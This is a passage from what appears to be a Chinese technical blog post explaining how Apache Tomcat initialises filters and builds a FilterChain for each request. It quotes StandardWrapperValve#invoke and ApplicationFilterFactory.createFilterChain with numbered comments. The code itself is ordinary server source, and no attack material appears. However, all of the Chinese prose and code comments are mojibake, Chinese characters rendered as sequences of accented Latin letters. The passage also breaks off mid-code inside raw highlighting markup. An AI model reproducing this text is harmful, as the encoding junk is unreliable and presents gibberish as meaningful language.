</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">FilterDef</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">filterDefs</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">getLogger</span><span class="o">().</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34; Starting filter &#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;&#39;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ä¸ºæ¯ä¸€ä¸ªfilterDeféƒ½åˆ›å»ºä¸€ä¸ªfilterConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                        <span class="k">new</span> <span class="n">ApplicationFilterConfig</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// å°†åˆ›å»ºçš„filterConfigå­˜å…¥filterConfigsä¸­
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">t</span> <span class="o">=</span> <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">unwrapInvocationTargetException</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">handleThrowable</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;standardContext.filterStart&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">),</span> <span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ok</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>è‡³æ­¤ï¼ŒFilterçš„åˆå§‹åŒ–ä¹Ÿå®Œæˆäº†ï¼ŒTomcatæœåŠ¡å™¨å·²ç»å¼€å§‹æ­£å¸¸è¿è¡Œï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹å…·ä½“åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼ŒTomcatåšäº†ä»€ä¹ˆï¼› <!-- raw HTML omitted --></p>
<h4 id="filterè¿‡æ»¤è¯·æ±‚">Filterè¿‡æ»¤è¯·æ±‚</h4>
<p>å½“Tomcatæ¥å—åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ä¹‹åï¼Œä¼šé€šè¿‡Connectorè¿æ¥å™¨å°†è¯·æ±‚å°è£…æˆServletRequestå¯¹è±¡ï¼Œå¹¶ä¼ é€’ç»™Containerå®¹å™¨è¿›è¡Œå…·ä½“çš„å¤„ç†ï¼Œè€ŒContaineråˆ™åˆ©ç”¨PipelineValveè´£ä»»é“¾çš„æ¨¡å¼ä¸æ–­æ ¹æ®HTTPè¯·æ±‚çš„ä¿¡æ¯å°†è¯·æ±‚äº¤ç”±ä¸åŒçš„Containerå­å®¹å™¨è¿›è¡Œå¤„ç†ï¼Œå…·ä½“çš„è¿‡ç¨‹ä¸å†èµ˜è¿°ï¼› <!-- raw HTML omitted --></p>
<p>æˆ‘ä»¬æ‰“ä¸Šæ–­ç‚¹æ ¹æ®è°ƒç”¨æ ˆæ¥çœ‹ä¸€ä¸‹Filteræ˜¯å¦‚ä½•è¢«è°ƒç”¨çš„ï¼š <!-- raw HTML omitted --></p>
<p>è´£ä»»é“¾çš„ç»ˆç‚¹æ¥åˆ° <strong>StandardWrapperValve#invoke()</strong> æ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>å…ˆæ˜¯åˆ›å»ºServletå®ä¾‹ï¼› <!-- raw HTML omitted --></li>
<li>å†åˆ›å»ºä¸€ä¸ªæ–°çš„FilterChainå®ä¾‹ï¼ˆFilterChainä¹Ÿæ˜¯ä¸€ä¸ªè´£ä»»é“¾ï¼Œå°†å¯¹äºè¯·æ±‚çš„è¿‡æ»¤è¡Œä¸ºåˆ†æ•£åˆ°äº†å¤šä¸ªFilterä¸Šï¼‰ï¼› <!-- raw HTML omitted --></li>
<li>è°ƒç”¨æ–°åˆ›å»ºçš„FilterChainå®ä¾‹çš„doFilter()æ–¹æ³•æ¥ç»§ç»­å¤„ç†è¯·æ±‚ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Initialize local variables we may need
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="n">StandardWrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardWrapper</span><span class="o">)</span> <span class="n">getContainer</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Servlet</span> <span class="n">servlet</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">Context</span><span class="o">)</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Allocate a servlet instance to process this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 1. åˆ†é…ä¸€ä¸ªServletå®ä¾‹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(!</span><span class="n">unavailable</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">servlet</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">allocate</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Create the filter chain for this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 2. ä½¿ç”¨Factoryå·¥å‚ç±»åˆ›å»ºä¸€ä¸ªfilterChainå®ä¾‹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                <span class="n">ApplicationFilterFactory</span><span class="o">.</span><span class="na">createFilterChain</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">servlet</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Call the filter chain for this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// NOTE: This also calls the servlet&#39;s service() method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Container</span> <span class="n">container</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">container</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">servlet</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">filterChain</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Swallow output if needed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getSwallowOutput</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">SystemLogHandler</span><span class="o">.</span><span class="na">startCapture</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncDispatching</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">request</span><span class="o">.</span><span class="na">getAsyncContextInternal</span><span class="o">().</span><span class="na">doInternalDispatch</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                            <span class="c1">// 3. è°ƒç”¨åˆ›å»ºçš„filterChainçš„doFilteræ–¹æ³•æ¥å¤„ç†è¯·æ±‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">response</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncDispatching</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">request</span><span class="o">.</span><span class="na">getAsyncContextInternal</span><span class="o">().</span><span class="na">doInternalDispatch</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="c1">// 3. è°ƒç”¨åˆ›å»ºçš„filterChainçš„doFilteræ–¹æ³•æ¥å¤„ç†è¯·æ±‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span>
</span></span><span class="line"><span class="cl">                            <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span> <span class="n">response</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>ä»ä¸Šé¢çš„å†…å®¹ä¸­ï¼Œæˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªä¿¡æ¯ï¼Œå°±æ˜¯Tomcatåœ¨æ¯æ¬¡éœ€è¦å¤„ç†ä¸€ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œæœ€ç»ˆéƒ½ä¼šè¢«ä¸€ä¸ªServletæ‰€å¤„ç†ï¼Œå¹¶ä¸”éƒ½ä¼šä¸ºè¿™ä¸ªServleté‡æ–°æ„å»ºä¸€ä¸ªæ–°çš„ <strong>FilterChain</strong>, é‚£ä¹ˆè‡ªç„¶ä¹Ÿå¯ä»¥çŒœåˆ°ï¼ŒFilterChainä¸­å†…ç½®çš„Filterä¹Ÿä¼šè¢«é‡æ–°åŠ è½½ä¸€éï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…·ä½“æ¥çœ‹ä¸€ä¸‹ä¸€ä¸ªFilterChainçš„å®ä¾‹å¯¹è±¡æ˜¯å¦‚ä½•è¢«æ„é€ çš„ï¼š <!-- raw HTML omitted --></p>
<p>è¿™é‡ŒTomactä½¿ç”¨äº†å·¥å‚ç±» <strong>ApplicationFilterFactory</strong> æ¥æ„é€  <strong>FilterChain</strong> å®ä¾‹ï¼ŒApplicaitonFilterFactory.createFilterChain(): <!-- raw HTML omitted --></p>
<ol>
<li>æ ¹æ®è¯·æ±‚å¯¹è±¡ï¼Œæ„é€ ä¸€ä¸ªApplicationFilterChainå®ä¾‹ï¼› <!-- raw HTML omitted --></li>
<li>FilterChainéœ€è¦åŒ…å«æ‰€å¯¹åº”çš„Servletï¼› <!-- raw HTML omitted --></li>
<li>è·å–Dispatcherä»¥åŠè¯·æ±‚è·¯å¾„requestPathçš„ä¿¡æ¯ï¼› <!-- raw HTML omitted --></li>
<li>æ ¹æ®è¯·æ±‚çš„URLè·¯å¾„åˆ¤æ–­éœ€è¦åŠ è½½çš„Filterï¼› <!-- raw HTML omitted --></li>
<li>å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼› <!-- raw HTML omitted --></li>
<li>æ ¹æ®web.xmlé…ç½®æ–‡ä»¶ä¸­ï¼Œ&lt;filter-map&gt;æ ‡ç­¾ä¸­çš„å­æ ‡ç­¾&lt;servlet-name&gt;,åŠ è½½å“ªäº›ä¸“é—¨ä¸ºç‰¹å®šServletæœåŠ¡çš„filter <!-- raw HTML omitted --></li>
<li>å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">ApplicationFilterChain</span> <span class="nf">createFilterChain</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">Wrapper</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">Servlet</span> <span class="n">servlet</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. æ ¹æ®è¯·æ±‚å¯¹è±¡ï¼Œæ„é€ ä¸€ä¸ªApplicationFilterChainå®ä¾‹ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">Request</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">request</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterChain</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">filterChain</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">req</span><span class="o">.</span><span class="na">setFilterChain</span><span class="o">(</span><span class="n">filterChain</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. FilterChainéœ€è¦åŒ…å«æ‰€å¯¹åº”çš„Servletï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">servlet</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterChain</span><span class="o">.</span><span class="na">setServletSupportsAsync</span><span class="o">(</span><span class="n">wrapper</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">FilterMap</span> <span class="n">filterMaps</span><span class="o">[]</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">findFilterMaps</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. è·å–Dispatcherä»¥åŠè¯·æ±‚è·¯å¾„requestPathçš„ä¿¡æ¯ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">DispatcherType</span> <span class="n">dispatcher</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">            <span class="o">(</span><span class="n">DispatcherType</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">DISPATCHER_TYPE_ATTR</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">requestPath</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">attribute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">DISPATCHER_REQUEST_PATH_ATTR</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">attribute</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">requestPath</span> <span class="o">=</span> <span class="n">attribute</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servletName</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 4. æ ¹æ®è¯·æ±‚çš„URLè·¯å¾„åˆ¤æ–­éœ€è¦åŠ è½½çš„Filterï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersURL</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">requestPath</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 5. å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Add filters that match on servlet name second
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 6. æ ¹æ®web.xmlé…ç½®æ–‡ä»¶ä¸­ï¼Œ&lt;filter-map&gt;æ ‡ç­¾ä¸­çš„å­æ ‡ç­¾&lt;servlet-name&gt;,åŠ è½½å“ªäº›ä¸“é—¨ä¸ºç‰¹å®šServletæœåŠ¡çš„filterï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersServlet</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">servletName</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 7. å°†éœ€è¦åŠ è½½çš„FilteråŠ è½½åˆ°FilterChainå½“ä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">filterChain</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>åœ¨çŸ¥é“äº†ä¸ºä¸€ä¸ªè¯·æ±‚çš„å¤„ç†æ‰€æ„é€ FilterChainçš„è¿‡ç¨‹ä¹‹åï¼Œæˆ‘ä»¬æ¥é‡ç‚¹å…³æ³¨å°†FilteråŠ å…¥FilterChainçš„è¿‡ç¨‹ï¼Œä»ä¸­æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯æ˜¯ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>ä¸€ä¸ªFilteræ˜¯å¦ä¼šåŠ å…¥æœ¬æ¬¡çš„FilterChainçš„åˆ¤æ–­æ ‡å‡†å°±æ˜¯ï¼Œå…¶ä¿å­˜çš„FilterMapï¼ˆ&lt;filter-mapping&gt;ï¼‰æ ‡ç­¾ä¿¡æ¯ï¼Œæ˜¯å¦æ»¡è¶³ï¼š <!-- raw HTML omitted -->
<ul>
<li>è¯·æ±‚æ‰€å¯¹åº”çš„URLä¿¡æ¯ï¼› <!-- raw HTML omitted --></li>
<li>è¯·æ±‚æ‰€å¯¹åº”çš„Servletï¼› <!-- raw HTML omitted --></li>
</ul>
</li>
<li>åœ¨ç¡®å®šäº†è¦åŠ å…¥çš„Filterä¹‹åï¼Œéœ€è¦æ ¹æ®åœ¨Tomcatå¯åŠ¨é˜¶æ®µåˆå§‹åŒ–Filteræ‰€å°è£…æˆFilterConfigå¯¹è±¡åŠ å…¥æœ¬æ¬¡è¯·æ±‚å¤„ç†çš„FilterChainå½“ä¸­å³å¯ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 4. æ ¹æ®è¯·æ±‚çš„URLè·¯å¾„åˆ¤æ–­éœ€è¦åŠ è½½çš„Filterï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersURL</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">requestPath</span><span class="o">))</span> <span class="o">{</span>
